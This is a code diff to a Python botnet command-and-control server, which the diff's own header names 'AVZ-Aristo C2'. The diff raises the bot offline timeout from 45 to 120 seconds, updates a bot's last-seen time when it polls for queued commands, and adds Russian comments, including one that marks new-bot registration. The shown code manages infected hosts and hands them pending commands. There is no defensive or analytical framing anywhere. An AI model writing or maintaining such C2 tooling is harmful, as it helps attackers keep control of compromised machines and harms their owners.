@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# AVZ-Aristo C2 v26.10 – статус online при ping, таймаут 120с, delete
 import asyncio, json, os, time, subprocess, requests
 from datetime import datetime
 
@@ -70,7 +71,8 @@ async def handle_client(reader, writer):
         bots_list = []
         for bot_ip, bot in bots.items():
             last_seen = datetime.strptime(bot["last_seen"], "%Y-%m-%d %H:%M:%S")
-            bot["status"] = "online" if (now - last_seen).total_seconds() < 45 else "offline"
+            # Увеличиваем таймаут offline до 120 секунд
+            bot["status"] = "online" if (now - last_seen).total_seconds() < 120 else "offline"
             bots_list.append(bot)
         writer.write(json.dumps(bots_list).encode())
     elif msg.startswith("delete:"):
@@ -112,11 +114,13 @@ async def handle_client(reader, writer):
             writer.write(json.dumps(pending).encode())
         else:
             writer.write(b"no commands")
+        # Обновляем время последней активности и статус
         if ip in bots:
             bots[ip]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             bots[ip]["status"] = "online"
             save_bots()
     else:
+        # Регистрация нового бота
         info = {}
         try:
             data = json.loads(msg)
